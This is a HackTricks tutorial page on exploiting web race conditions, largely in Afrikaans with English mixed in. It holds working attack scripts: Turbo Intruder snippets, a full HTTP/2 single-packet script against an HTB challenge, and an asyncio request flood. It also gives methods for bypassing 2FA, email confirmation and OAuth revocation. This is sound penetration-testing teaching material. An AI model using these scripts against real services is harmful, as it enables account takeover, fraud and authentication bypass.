# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Vir 'n diep begrip van hierdie tegniek, sien die oorspronklike verslag by [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbetering van Race Condition-aanvalle

Die grootste struikelblok om voordeel te trek uit race conditions is om te verseker dat meerdere requests terselfdertyd hanteer word, met **baie min verskil in hul verwerkingstye—ideaal minder as 1ms**.

Hier kan jy 'n paar tegnieke vind om requests te sinkroniseer:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Ondersteun die stuur van twee requests oor 'n enkele TCP-verbinding, wat die impak van netwerk-jitter verminder. Weens bediener-side variasies mag twee requests egter nie genoeg wees vir 'n konsekwente race condition-uitbuiting nie.
- **HTTP/1.1 'Last-Byte Sync'**: Maak dit moontlik om die meeste dele van 20-30 requests vooraf te stuur, terwyl 'n klein fragment teruggehou word, wat dan saam gestuur word, en sodoende gelyktydige aankoms by die bediener bereik.

**Voorbereiding vir Last-Byte Sync** behels:

1. Stuur headers en body-data minus die laaste byte sonder om die stroom te beëindig.
2. Pouseer vir 100ms na die aanvanklike stuur.
3. Deaktiveer TCP_NODELAY om Nagle's algorithm te gebruik vir die groepering van finale frames.
4. Pinging om die verbinding op te warm.

Die daaropvolgende stuur van die teruggehoue frames behoort tot hul aankoms in 'n enkele pakket te lei, wat met Wireshark verifieerbaar is. Hierdie metode is nie van toepassing op statiese lêers nie, wat gewoonlik nie by RC attacks betrokke is nie.

### Aanpassing by bediener-argitektuur

Om die teiken se argitektuur te verstaan is noodsaaklik. Front-end servers kan requests anders routeer, wat die timing beïnvloed. Preemptiewe server-side verbindingsopwarming deur onbeduidende requests kan versoektiming normaliseer.

#### Hantering van Session-Based Locking

Frameworks soos PHP se session handler serialiseer requests per session, wat moontlik kwesbaarhede verskuil. Deur vir elke request verskillende session tokens te gebruik, kan hierdie probleem omseil word.

#### Oorkom Rate- of Hulpbronbeperkings

As verbinding-opwarming ondoeltreffend is, kan die doelbewuste veroorsaak van webservers se rate- of hulpbronlimiet-vertragings deur 'n vloed van dummy requests die single-packet attack vergemaklik deur 'n server-side vertraging te skep wat race conditions bevorder.

## Voorbeelde van Aanvalle

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Jy kan die request stuur na **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), jy kan in die request die waarde verander wat jy wil brute force vir **`%s`** soos in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` en dan die **`examples/race-single-packer-attack.py`** uit die keuselys kies:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

As jy van plan is om **verskillende waardes te stuur**, kan jy die kode wysig met hierdie een wat 'n woordlys vanaf die klembord gebruik:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> As die web HTTP2 nie ondersteun nie (slegs HTTP1.1), gebruik `Engine.THREADED` of `Engine.BURP` in plaas van `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: As jy 'n versoek na 1 endpoint moet stuur en dan verskeie na ander endpoints om die RCE te trigger, kan jy die `race-single-packet-attack.py`-skrip verander met iets soos:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Dit is ook beskikbaar in **Repeater** via die nuwe '**Send group in parallel**' opsie in Burp Suite.
- Vir **limit-overrun** kan jy net die **same request 50 times** by die groep voeg.
- Vir **connection warming** kan jy **add** aan die **beginning** van die **group** 'n paar **requests** na 'n nie-statiese deel van die web server.
- Vir **delaying** die proses **between** die verwerking van **one request and another** in 'n 2 substates stappe, kan jy **add extra requests between** beide requests.
- Vir 'n **multi-endpoint** RC kan jy begin deur die **request** te stuur wat **goes to the hidden state** en dan net ná dit **50 requests** wat die **hidden state** **exploits**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Die doel van hierdie skrip is om die e-pos van 'n gebruiker te verander terwyl dit voortdurend verifieer totdat die verification token van die nuwe e-pos by die laaste e-pos aankom (dit is omdat die kode 'n RC gesien het waar dit moontlik was om 'n e-pos te wysig maar die verification na die ou een gestuur is omdat die veranderlike wat die e-pos aandui reeds met die eerste gevul was).\
Wanneer die woord "objetivo" in die ontvangde e-posse gevind word, weet ons dat ons die verification token van die veranderde e-pos ontvang het en ons beëindig die aanval.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Verbetering van Single Packet Attack

In die oorspronklike navorsing word verduidelik dat hierdie aanval 'n limiet van 1,500 bytes het. Echter, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), is verduidelik hoe dit moontlik is om die 1,500-byte beperking van die single packet attack uit te brei na die **65,535 B window limitation of TCP by using IP layer fragmentation** (deur 'n enkele pakket in verskeie IP-pakkette op te deel) en dit in 'n ander volgorde te stuur, wat voorkom dat die pakket saamgestel word totdat al die fragmente die bediener bereik het. Hierdie tegniek het die navorser in staat gestel om ongeveer 10,000 requests in ~166ms te stuur.

Let daarop dat alhoewel hierdie verbetering die aanval meer betroubaar maak in RC wat honderde/duisende pakkette vereis om terselfdertyd aan te kom, dit ook sekere sagteware-beperkings kan hê. Sommige populêre HTTP-servers soos Apache, Nginx en Go het 'n streng `SETTINGS_MAX_CONCURRENT_STREAMS` instelling van 100, 128 en 250. Ander soos NodeJS en nghttp2 het dit egter onbeperk.\
Dit beteken basies dat Apache slegs 100 HTTP-verbindinge vanaf 'n enkele TCP-verbinding sal oorweeg (wat hierdie RC-aanval beperk).

Jy kan sommige voorbeelde wat hierdie tegniek gebruik in die repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main) vind.

## Raw BF

Voor die vorige navorsing was dit sommige payloads wat gebruik is wat net probeer het om die pakkette so vinnig as moontlik te stuur om 'n RC te veroorsaak.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Stuur die **request** na **Intruder**, stel die **number of threads** op **30** in die **Options menu**, en kies as payload **Null payloads** en genereer **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Dit is die mees basiese tipe race condition waar **vulnerabilities** voorkom op plekke wat die aantal kere wat jy 'n aksie kan uitvoer beperk. Soos om dieselfde discount code in 'n web store verskeie kere te gebruik. 'n Baie eenvoudige voorbeeld is te vind in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) of in [**this bug**](https://hackerone.com/reports/759247)**.**

Daar is baie variasies van hierdie soort aanval, insluitend:

- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balance
- Reusing a single CAPTCHA solution
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

Exploiting complex race conditions behels dikwels om voordeel te trek uit kortgeleentheid om met verborgen of **unintended machine substates** te interaksie. Hier is hoe om dit te benader:

1. **Identify Potential Hidden Substates**
- Begin deur endpunte te identifiseer wat kritiese data wysig of daarmee interaksie het, soos user profiles of password reset-processes. Fokus op:
- **Storage**: Gee voorkeur aan endpunte wat server-side persistent data manipuleer bo daardie wat data client-side hanteer.
- **Action**: Soek na operasies wat bestaande data verander — dit is meer geneig om uitbuitbare toestande te skep in vergelyking met dié wat nuwe data byvoeg.
- **Keying**: Suksesvolle aanvalle behels gewoonlik operasies wat op dieselfde identifier gemik is, bv. username of reset token.
2. **Conduct Initial Probing**
- Toets die geïdentifiseerde endpunte met race condition-aanvalle en let op afwykings van verwagte uitkomste. Onverwagte antwoorde of veranderinge in toepassinggedrag kan 'n kwetsbaarheid aandui.
3. **Demonstrate the Vulnerability**
- Smal die aanval in tot die minimale aantal versoeke wat nodig is om die kwetsbaarheid uit te buit, dikwels net twee. Hierdie stap kan meerdere pogings of outomatisering vereis weens die presiese tydsberekening wat betrokke is.

### Time Sensitive Attacks

Presisie in die tydsberekening van versoeke kan kwetsbaarhede openbaar, veral wanneer voorspelbare metodes soos timestamps gebruik word vir security tokens. Byvoorbeeld, die genereer van password reset tokens gebaseer op timestamps kan identiese tokens vir simultane versoeke toelaat.

**To Exploit:**

- Gebruik presiese tydsberekening, soos 'n single packet attack, om concurrent password reset requests te verstuur. Identiese tokens dui op 'n kwetsbaarheid.

**Example:**

- Request two password reset tokens op presies dieselfde tyd en vergelyk hulle. Ooreenstemmende tokens dui op 'n fout in token generation.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) om te sien hoe om in 'n store te **pay** en 'n **extra** item by te **add** wat jy nie hoef te betaal nie.

### Confirm other emails

Die idee is om 'n e-posadres te **verify** en dit terselfdertyd na 'n ander een te verander om te ontdek of die platform die nuwe een verifieer.

### Change email to 2 emails addresses Cookie based

Volgens [**this research**](https://portswigger.net/research/smashing-the-state-machine) was Gitlab op hierdie wyse kwesbaar vir 'n takeover omdat dit moontlik die **email verification token of one email to the other email** kan **send**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

As **2 different writes** gebruik word om **information** binne 'n **database** by te voeg, bestaan daar 'n klein tydsbestek waarin slegs die eerste data geskryf is in die database. Byvoorbeeld, wanneer 'n user geskep word, kan die **username** en **password** geskryf word en daarna die token om die nuut geskepte account te bevestig. Dit beteken dat vir 'n kort tyd die **token to confirm an account is null**.

Daarom kan **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) om die account dadelik te bevestig toelaat om **bevestig 'n rekening** waar jy nie die e-pos beheer nie.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Die volgende pseudo-code is kwetsbaar vir race condition omdat daar in 'n baie klein tydsbestek die **2FA is not enforced** terwyl die session geskep word:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Hierdie dienste laat jou toe om 'n toepassing te skep en gebruikers te verifieer wat deur die provider geregistreer is. Om dit te doen, sal die **client** jou **toepassing toestemming moet gee** om 'n deel van hul data binne die **OAUth provider** te bereik.\
Tot dusver net 'n gewone login met google/linkedin/github... waar jy 'n bladsy gesien kry wat sê: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Die **probleem** verskyn wanneer jy **dit aanvaar** en dit outomaties 'n **`authorization_code`** na die kwaadwillige toepassing stuur. Dan misbruik die toepassing 'n Race Condition in die OAUth service provider om meer as een AT/RT (_Authentication Token/Refresh Token_) uit die **`authorization_code`** vir jou rekening te genereer. Basies sal dit die feit misbruik dat jy die toepassing toegang tot jou data gegee het om **verskeie rekeninge te skep**. Daarna, selfs al stop jy om die toepassing toegang tot jou data te gee, sal een paar AT/RT verwyder word, maar die ander sal steeds geldig wees.

#### Race Condition in `Refresh Token`

Sodra jy 'n **geldige RT** verkry het, kan jy probeer om dit te **misbruik om verskeie AT/RT te genereer** en **selfs as die gebruiker die toestemmings vir die kwaadwillige toepassing kanselleer**, sal **verskeie RTs steeds geldig bly.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) vind jy 'n PoC in Java om websocket boodskappe in **parallel** te stuur om **Race Conditions ook in Web Sockets** te misbruik.
- Met Burp’s WebSocket Turbo Intruder kan jy die **THREADED** engine gebruik om meerdere WS-verbindinge te skep en payloads parallel te stuur. Begin by die amptelike voorbeeld en stel `config()` (thread count) vir concurrency af; dit is dikwels meer betroubaar as om op 'n enkele verbinding te batche wanneer jy server‑side state oor WS handlers probeer race. Sien [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Verwysings

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
